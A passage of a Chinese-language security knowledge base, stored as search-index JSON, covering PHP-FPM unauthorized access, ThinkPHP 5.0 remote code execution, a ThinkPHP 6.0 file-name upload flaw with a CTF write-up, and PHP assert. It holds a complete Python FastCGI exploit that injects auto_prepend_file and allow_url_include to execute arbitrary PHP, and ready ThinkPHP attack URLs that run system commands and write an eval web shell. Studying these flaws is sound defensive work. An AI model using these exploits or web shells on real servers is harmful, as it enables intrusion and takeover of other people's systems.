info\u4fe1\u606f\u53bb\u9664\u540e\uff0c\u7528tryfiles\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff1b\u4e8c\u662f\u501f\u52a9PHP-FPM\u7684<code>security.limit_extensions</code>\u914d\u7f6e\u9879\uff0c\u907f\u514d\u5176\u4ed6\u540e\u7f00\u6587\u4ef6\u88ab\u89e3\u6790\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#securitylimit_extensions","title":"<code>security.limit_extensions</code>\u914d\u7f6e","text":"<p>\u5199\u5230\u8fd9\u91cc\uff0cPHP-FPM\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u4e5f\u5c31\u547c\u4e4b\u6b32\u51fa\u4e86\u3002PHP-FPM\u9ed8\u8ba4\u76d1\u542c9000\u7aef\u53e3\uff0c\u5982\u679c\u8fd9\u4e2a\u7aef\u53e3\u66b4\u9732\u5728\u516c\u7f51\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u6784\u9020fastcgi\u534f\u8bae\uff0c\u548cfpm\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u6b64\u65f6\uff0c<code>SCRIPT_FILENAME</code>\u7684\u503c\u5c31\u683c\u5916\u91cd\u8981\u4e86\u3002\u56e0\u4e3afpm\u662f\u6839\u636e\u8fd9\u4e2a\u503c\u6765\u6267\u884cphp\u6587\u4ef6\u7684\uff0c\u5982\u679c\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u5b58\u5728\uff0cfpm\u4f1a\u76f4\u63a5\u8fd4\u56de404\uff1a</p> <p></p> <p>\u5728fpm\u67d0\u4e2a\u7248\u672c\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06<code>SCRIPT_FILENAME</code>\u7684\u503c\u6307\u5b9a\u4e3a\u4efb\u610f\u540e\u7f00\u6587\u4ef6\uff0c\u6bd4\u5982<code>/etc/passwd</code>\uff1b\u4f46\u540e\u6765\uff0cfpm\u7684\u9ed8\u8ba4\u914d\u7f6e\u4e2d\u589e\u52a0\u4e86\u4e00\u4e2a\u9009\u9879<code>security.limit_extensions</code>\uff1a</p> <pre><code>; Limits the extensions of the main script FPM will allow to parse. This can\n; prevent configuration mistakes on the web server side. You should only limit\n; FPM to .php extensions to prevent malicious users to use other extensions to\n; exectute php code.\n; Note: set an empty value to allow all extensions.\n; Default Value: .php\n;security.limit_extensions = .php .php3 .php4 .php5 .php7\n</code></pre> <p>\u5176\u9650\u5b9a\u4e86\u53ea\u6709\u67d0\u4e9b\u540e\u7f00\u7684\u6587\u4ef6\u5141\u8bb8\u88abfpm\u6267\u884c\uff0c\u9ed8\u8ba4\u662f<code>.php</code>\u3002\u6240\u4ee5\uff0c\u5f53\u6211\u4eec\u518d\u4f20\u5165<code>/etc/passwd</code>\u7684\u65f6\u5019\uff0c\u5c06\u4f1a\u8fd4\u56de<code>Access denied.</code>\uff1a</p> <p></p> <p>ps. \u8fd9\u4e2a\u914d\u7f6e\u4e5f\u4f1a\u5f71\u54cdNginx\u89e3\u6790\u6f0f\u6d1e\uff0c\u6211\u89c9\u5f97\u5e94\u8be5\u662f\u56e0\u4e3aNginx\u5f53\u65f6\u90a3\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u4fc3\u6210PHP-FPM\u589e\u52a0\u4e86\u8fd9\u4e2a\u5b89\u5168\u9009\u9879\u3002\u53e6\u5916\uff0c\u4e5f\u6709\u5c11\u90e8\u5206\u53d1\u884c\u7248\u5b89\u88c5\u4e2d<code>security.limit_extensions</code>\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u6b64\u65f6\u5c31\u6ca1\u6709\u4efb\u4f55\u9650\u5236\u4e86\u3002</p> <p>\u7531\u4e8e\u8fd9\u4e2a\u914d\u7f6e\u9879\u7684\u9650\u5236\uff0c\u5982\u679c\u60f3\u5229\u7528PHP-FPM\u7684\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u9996\u5148\u5c31\u5f97\u627e\u5230\u4e00\u4e2a\u5df2\u5b58\u5728\u7684PHP\u6587\u4ef6\u3002</p> <p>\u4e07\u5e78\u7684\u662f\uff0c\u901a\u5e38\u4f7f\u7528\u6e90\u5b89\u88c5php\u7684\u65f6\u5019\uff0c\u670d\u52a1\u5668\u4e0a\u90fd\u4f1a\u9644\u5e26\u4e00\u4e9bphp\u540e\u7f00\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528<code>find / -name \"*.php\"</code>\u6765\u5168\u5c40\u641c\u7d22\u4e00\u4e0b\u9ed8\u8ba4\u73af\u5883\uff1a</p> <p></p> <p>\u627e\u5230\u4e86\u4e0d\u5c11\u3002\u8fd9\u5c31\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u6761\u601d\u8def\uff0c\u5047\u8bbe\u6211\u4eec\u7206\u7834\u4e0d\u51fa\u6765\u76ee\u6807\u73af\u5883\u7684web\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u627e\u9ed8\u8ba4\u6e90\u5b89\u88c5\u540e\u53ef\u80fd\u5b58\u5728\u7684php\u6587\u4ef6\uff0c\u6bd4\u5982<code>/usr/local/lib/php/PEAR.php</code>\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","title":"\u4efb\u610f\u4ee3\u7801\u6267\u884c","text":"<p>\u90a3\u4e48\uff0c\u4e3a\u4ec0\u4e48\u6211\u4eec\u63a7\u5236fastcgi\u534f\u8bae\u901a\u4fe1\u7684\u5185\u5bb9\uff0c\u5c31\u80fd\u6267\u884c\u4efb\u610fPHP\u4ee3\u7801\u5462\uff1f</p> <p>\u7406\u8bba\u4e0a\u5f53\u7136\u662f\u4e0d\u53ef\u4ee5\u7684\uff0c\u5373\u4f7f\u6211\u4eec\u80fd\u63a7\u5236<code>SCRIPT_FILENAME</code>\uff0c\u8ba9fpm\u6267\u884c\u4efb\u610f\u6587\u4ef6\uff0c\u4e5f\u53ea\u662f\u6267\u884c\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u5e76\u4e0d\u80fd\u6267\u884c\u6211\u4eec\u9700\u8981\u5176\u6267\u884c\u7684\u6587\u4ef6\u3002</p> <p>\u4f46PHP\u662f\u4e00\u95e8\u5f3a\u5927\u7684\u8bed\u8a00\uff0cPHP.INI\u4e2d\u6709\u4e24\u4e2a\u6709\u8da3\u7684\u914d\u7f6e\u9879\uff0c<code>auto_prepend_file</code>\u548c<code>auto_append_file</code>\u3002</p> <p><code>auto_prepend_file</code>\u662f\u544a\u8bc9PHP\uff0c\u5728\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e4b\u524d\uff0c\u5148\u5305\u542b<code>auto_prepend_file</code>\u4e2d\u6307\u5b9a\u7684\u6587\u4ef6\uff1b<code>auto_append_file</code>\u662f\u544a\u8bc9PHP\uff0c\u5728\u6267\u884c\u5b8c\u6210\u76ee\u6807\u6587\u4ef6\u540e\uff0c\u5305\u542b<code>auto_append_file</code>\u6307\u5411\u7684\u6587\u4ef6\u3002</p> <p>\u90a3\u4e48\u5c31\u6709\u8da3\u4e86\uff0c\u5047\u8bbe\u6211\u4eec\u8bbe\u7f6e<code>auto_prepend_file</code>\u4e3a<code>php://input</code>\uff0c\u90a3\u4e48\u5c31\u7b49\u4e8e\u5728\u6267\u884c\u4efb\u4f55php\u6587\u4ef6\u524d\u90fd\u8981\u5305\u542b\u4e00\u904dPOST\u7684\u5185\u5bb9\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u5f85\u6267\u884c\u7684\u4ee3\u7801\u653e\u5728Body\u4e2d\uff0c\u4ed6\u4eec\u5c31\u80fd\u88ab\u6267\u884c\u4e86\u3002\uff08\u5f53\u7136\uff0c\u8fd8\u9700\u8981\u5f00\u542f\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u9009\u9879<code>allow_url_include</code>\uff09</p> <p>\u90a3\u4e48\uff0c\u6211\u4eec\u600e\u4e48\u8bbe\u7f6e<code>auto_prepend_file</code>\u7684\u503c\uff1f</p> <p>\u8fd9\u53c8\u6d89\u53ca\u5230PHP-FPM\u7684\u4e24\u4e2a\u73af\u5883\u53d8\u91cf\uff0c<code>PHP_VALUE</code>\u548c<code>PHP_ADMIN_VALUE</code>\u3002\u8fd9\u4e24\u4e2a\u73af\u5883\u53d8\u91cf\u5c31\u662f\u7528\u6765\u8bbe\u7f6ePHP\u914d\u7f6e\u9879\u7684\uff0c<code>PHP_VALUE</code>\u53ef\u4ee5\u8bbe\u7f6e\u6a21\u5f0f\u4e3a<code>PHP_INI_USER</code>\u548c<code>PHP_INI_ALL</code>\u7684\u9009\u9879\uff0c<code>PHP_ADMIN_VALUE</code>\u53ef\u4ee5\u8bbe\u7f6e\u6240\u6709\u9009\u9879\u3002\uff08<code>disable_functions</code>\u9664\u5916\uff0c\u8fd9\u4e2a\u9009\u9879\u662fPHP\u52a0\u8f7d\u7684\u65f6\u5019\u5c31\u786e\u5b9a\u4e86\uff0c\u5728\u8303\u56f4\u5185\u7684\u51fd\u6570\u76f4\u63a5\u4e0d\u4f1a\u88ab\u52a0\u8f7d\u5230PHP\u4e0a\u4e0b\u6587\u4e2d\uff09</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u6700\u540e\u4f20\u5165\u5982\u4e0b\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>{\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'GET',\n'SCRIPT_FILENAME': '/var/www/html/index.php',\n'SCRIPT_NAME': '/index.php',\n'QUERY_STRING': '?a=1&amp;b=2',\n'REQUEST_URI': '/index.php?a=1&amp;b=2',\n'DOCUMENT_ROOT': '/var/www/html',\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '12345',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1'\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\n</code></pre> <p>\u8bbe\u7f6e<code>auto_prepend_file = php://input</code>\u4e14<code>allow_url_include = On</code>\uff0c\u7136\u540e\u5c06\u6211\u4eec\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\u653e\u5728Body\u4e2d\uff0c\u5373\u53ef\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#exp","title":"EXP\u7f16\u5199","text":"<p>\u4e0a\u56fe\u4e2d\u7528\u5230\u7684EXP\uff0c\u5c31\u662f\u6839\u636e\u4e4b\u524d\u4ecb\u7ecd\u7684fastcgi\u534f\u8bae\u6765\u7f16\u5199\u7684\uff0c\u4ee3\u7801\u5982\u4e0b\uff1ahttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 \u3002\u517c\u5bb9Python2\u548cPython3\uff0c\u65b9\u4fbf\u5728\u5185\u7f51\u7528\u3002</p> <p>\u4ee3\u7801\uff1a</p> <pre><code>import socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\nimport base64\nimport urllib\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\nPY2 = True if sys.version_info.major == 2 else False\ndef bchr(i):\nif PY2:\nreturn force_bytes(chr(i))\nelse:\nreturn bytes([i])\ndef bord(c):\nif isinstance(c, int):\nreturn c\nelse:\nreturn ord(c)\ndef force_bytes(s):\nif isinstance(s, bytes):\nreturn s\nelse:\nreturn s.encode('utf-8', 'strict')\ndef force_text(s):\nif issubclass(type(s), str):\nreturn s\nif isinstance(s, bytes):\ns = str(s, 'utf-8', 'strict')\nelse:\ns = str(s)\nreturn s\nclass FastCGIClient:\n\"\"\"A Fast-CGI Client for Python\"\"\"\n# private\n__FCGI_VERSION = 1\n__FCGI_ROLE_RESPONDER = 1\n__FCGI_ROLE_AUTHORIZER = 2\n__FCGI_ROLE_FILTER = 3\n__FCGI_TYPE_BEGIN = 1\n__FCGI_TYPE_ABORT = 2\n__FCGI_TYPE_END = 3\n__FCGI_TYPE_PARAMS = 4\n__FCGI_TYPE_STDIN = 5\n__FCGI_TYPE_STDOUT = 6\n__FCGI_TYPE_STDERR = 7\n__FCGI_TYPE_DATA = 8\n__FCGI_TYPE_GETVALUES = 9\n__FCGI_TYPE_GETVALUES_RESULT = 10\n__FCGI_TYPE_UNKOWNTYPE = 11\n__FCGI_HEADER_SIZE = 8\n# request state\nFCGI_STATE_SEND = 1\nFCGI_STATE_ERROR = 2\nFCGI_STATE_SUCCESS = 3\ndef __init__(self, host, port, timeout, keepalive):\nself.host = host\nself.port = port\nself.timeout = timeout\nif keepalive:\nself.keepalive = 1\nelse:\nself.keepalive = 0\nself.sock = None\nself.requests = dict()\ndef __connect(self):\nself.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nself.sock.settimeout(self.timeout)\nself.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n# if self.keepalive:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n# else:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\ntry:\nself.sock.connect((self.host, int(self.port)))\nexcept socket.error as msg:\nself.sock.close()\nself.sock = None\nprint(repr(msg))\nreturn False\nreturn True\ndef __encodeFastCGIRecord(self, fcgi_type, content, requestid):\nlength = len(content)\nbuf = bchr(FastCGIClient.__FCGI_VERSION) \\\n+ bchr(fcgi_type) \\\n+ bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(requestid &amp; 0xFF) \\\n+ bchr((length &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(length &amp; 0xFF) \\\n+ bchr(0) \\\n+ bchr(0) \\\n+ content\nreturn buf\ndef __encodeNameValueParams(self, name, value):\nnLen = len(name)\nvLen = len(value)\nrecord = b''\nif nLen &lt; 128:\nrecord += bchr(nLen)\nelse:\nrecord += bchr((nLen &gt;&gt; 24) | 0x80) \\\n+ bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(nLen &amp; 0xFF)\nif vLen &lt; 128:\nrecord += bchr(vLen)\nelse:\nrecord += bchr((vLen &gt;&gt; 24) | 0x80) \\\n+ bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(vLen &amp; 0xFF)\nreturn record + name + value\ndef __decodeFastCGIHeader(self, stream):\nheader = dict()\nheader['version'] = bord(stream[0])\nheader['type'] = bord(stream[1])\nheader['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])\nheader['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])\nheader['paddingLength'] = bord(stream[6])\nheader['reserved'] = bord(stream[7])\nreturn header\ndef __decodeFastCGIRecord(self, buffer):\nheader = buffer.read(int(self.__FCGI_HEADER_SIZE))\nif not header:\nreturn False\nelse:\nrecord = self.__decodeFastCGIHeader(header)\nrecord['content'] = b''\nif 'contentLength' in record.keys():\ncontentLength = int(record['contentLength'])\nrecord['content'] += buffer.read(contentLength)\nif 'paddingLength' in record.keys():\nskiped = buffer.read(int(record['paddingLength']))\nreturn record\ndef request(self, nameValuePairs={}, post=''):\nif not self.__connect():\nprint('connect failure! please check your fasctcgi-server !!')\nreturn\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nself.sock.send(request)\nself.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\nself.requests[requestId]['response'] = b''\nreturn self.__waitForResponse(requestId)\ndef gopher(self, nameValuePairs={}, post=''):\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nreturn request\ndef __waitForResponse(self, requestId):\ndata = b''\nwhile True:\nbuf = self.sock.recv(512)\nif not len(buf):\nbreak\ndata += buf\ndata = BytesIO(data)\nwhile True:\nresponse = self.__decodeFastCGIRecord(data)\nif not response:\nbreak\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\nor response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nself.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\nif requestId == int(response['requestId']):\nself.requests[requestId]['response'] += response['content']\nif response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\nself.requests[requestId]\nreturn self.requests[requestId]['response']\ndef __repr__(self):\nreturn \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\nif __name__ == '__main__':\nparser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\nparser.add_argument('host', help='Target host, such as 127.0.0.1')\nparser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\nparser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php echo \"PWNed\";?&gt;')\nparser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\nparser.add_argument('-e', '--ext', help='ext absolute path', default='')\nparser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')\nparser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)\nparser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)\nargs = parser.parse_args()\nclient = FastCGIClient(args.host, args.port, 3, 0)\nparams = dict()\ndocumentRoot = \"/\"\nuri = args.file\nparams = {\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'POST',\n'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n'SCRIPT_NAME': uri,\n'QUERY_STRING': '',\n'REQUEST_URI': uri,\n'DOCUMENT_ROOT': documentRoot,\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '9985',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1',\n'CONTENT_TYPE': 'application/text',\n'CONTENT_LENGTH': \"%d\" % len(args.code),\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\nif args.ext and args.include_file:\n#params['PHP_ADMIN_VALUE']='extension = '+args.ext\nparams['PHP_ADMIN_VALUE']=\"extension_dir = /var/www/html\\nextension = ant.so\"\nparams['PHP_VALUE']='auto_prepend_file = '+args.include_file\nif not args.url_format and not args.base64_format :\nresponse = client.request(params, args.code)\nprint(force_text(response))\nelse:\nresponse = client.gopher(params, args.code)\nif args.url_format:\nprint(urllib.quote(response))\nif args.base64_format:\nprint(base64.b64encode(response))\n</code></pre>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp5.0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"Thinkphp5.0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"<p>\u6f0f\u6d1e\u539f\u7406</p> <p>ThinkPHP 5.0 *  \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790_tdcoming'blog-CSDN\u535a\u5ba2_thinkphp\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p>ThinkPHP 5.0 *  \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5168\u7248\u672c\u901a\u6740\u672c\u6587\u4e3b\u8981\u4ee5\u5b98\u7f51\u4e0b\u8f7d\u76845.0.23 \u5b8c\u6574\u7248(thinkphp_5.0.23_with_extend.zip)\u4e3a\u4f8b\u5206\u6790\u3002Thinkphp\u5904\u7406\u8bf7\u6c42\u7684\u5173\u952e\u7c7b\u4e3aRequest(thinkphp/library/think/Request.php)\u8be5\u7c7b\u53ef\u4ee5\u5b9e\u73b0\u5bf9HTTP\u8bf7\u6c42\u7684\u4e00\u4e9b\u8bbe\u7f6e\u3002\u5176\u4e2d\u6210\u5458\u51fd\u6570method\u7528\u6765\u83b7\u53d6\u5f53\u524d\u8bf7\u6c42\u7c7b\u578b\uff0c\u5176\u5b9a\u4e49\u5982\u4e0b\uff1a...</p> <p>https://blog.csdn.net/qq_29647709/article/details/86307859</p> <p>\u6f0f\u6d1e\u5229\u7528\uff1a</p> <p>1.\u5229\u7528system\u51fd\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c</p> <p>http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</p> <p></p> <p>2.\u901a\u8fc7phpinfo\u51fd\u6570\u5199\u51faphpinfo()\u7684\u4fe1\u606f</p> <p>http://localhost:9096/public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</p> <p></p> <p>3.\u5199\u5165shell:</p> <p>http://localhost:9096/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%3C?php%20@eval($_GET[%22code%22])?%3E%3Eshell.php</p> <p></p> <p>\u6216\u8005</p> <p>http://localhost:9096/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo 'ok';?&gt;</p> <p></p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/Thinkphp6.0.0-6.0.1%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"Thinkphp6.0.0-6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e</p> <p>thinkphp\u7684\u6f0f\u6d1e\u611f\u89c9\u786e\u5b9e\u662f\u5f88\u591a\u3002</p> <p>\u7b80\u5355\u7684\u6982\u62ec\u5c31\u662f\u7531\u4e8e\u5b83\u81ea\u5df1\u7684\u4ee3\u7801\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u62ff\u5230shell</p> <p>2020\u5e741\u670810\u65e5\uff0cThinkPHP\u56e2\u961f\u53d1\u5e03\u4e00\u4e2a\u8865\u4e01\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u7531\u4e0d\u5b89\u5168\u7684SessionId\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u64cd\u4f5c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u5728\u76ee\u6807\u73af\u5883\u542f\u7528session\u7684\u6761\u4ef6\u4e0b\u521b\u5efa\u4efb\u610f\u6587\u4ef6\u4ee5\u53ca\u5220\u9664\u4efb\u610f\u6587\u4ef6\uff0c\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u8fd8\u53ef\u4ee5getshell\u3002</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u800c<code>$sessionId</code>\u662fcookie\u4e2d\u540d\u4e3aPHPSESSID\u7684\u503c\uff0c\u56e0\u6b64\u662f\u653b\u51fb\u8005\u53ef\u63a7\u7684\uff0c\u4ece\u800c\u5bfc\u81f4\u5199\u5165\u7684\u6587\u4ef6\u540d\u53ef\u63a7\u3002</p> <p>\u539f\u7406\u9898\uff1a</p> <p>[GYCTF2020]EasyThinking</p> <p>\u9996\u5148\u6253\u5f00\u9898\u76ee\u6ce8\u518c\u540e\u5728url\u4e0a\u4e71\u8f93\u4e86\u4e00\u901a\uff1a</p> <p>get\u5230\u4e86\u6846\u67b6\u7684\u7248\u672c\uff0c\u76f4\u89c9\u544a\u8bc9\u6211\u4eec\u4e00\u822c\u90fd\u662f\u67d0\u4e2a\u8865\u4e01\u3002\u641c\u5230\u4e86\u4e0a\u9762\u7684thinkphp6.0.0\u7684\u6587\u4ef6\u540d\u4e0a\u4f20\u3002</p> <p>\u7136\u540e\u8fd8\u6709\u4e00\u4e2asearch\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u80fd\u591fpost\u6570\u636e\u4e0a\u53bb\u3002</p> <p>\u81f3\u4e8e\u4fdd\u5b58\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e2awww.zip\u53ef\u4ee5\u770b\u5230\u3002</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u6b63\u5e38\u60c5\u51b5\u4e0b\u90a3\u5c31\u7528\u8681\u5251\u6765\u8fde\u63a5\uff0c\u8fde\u63a5\u4e4b\u540e\u7684\u754c\u9762\u8fd9\u6837\uff0c\u6709\u4e2a./readflag\uff0c\u4f46\u7531\u4e8e\u662fdisable_function\uff0c\u4e00\u822c\u547d\u4ee4\u90fd\u8fc7\u4e0d\u4e86\u3002</p> <p>\u4e4b\u540e\u7528\u5230ld_preload\u8fdb\u7a0b\u6ce8\u5165\u7684\u7ed5\u8fc7\uff0c\u539f\u7406\u4e4b\u524d\u505a\u679c\u4e00\u4e9b\u603b\u7ed3\uff0c\u8fd9\u91cc\u4e0d\u8d58\u8ff0\uff0c\u76f4\u63a5\u7528\u8681\u5251\u4e0a\u7684\u63d2\u4ef6\u3002</p> <p>Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a</p> <p>\u4f20\u6f0f\u6d1e.md(2.5 KB)</p> <ul> <li>0%</li> </ul>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/assert%E6%96%AD%E8%A8%80/","title":"assert\u65ad\u8a00","text":"<p>php5\u4e2d\uff0cassert\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7f='assert';f(...);\u8fd9\u6837\u7684\u65b9\u6cd5\u6765\u52a8\u6001\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> 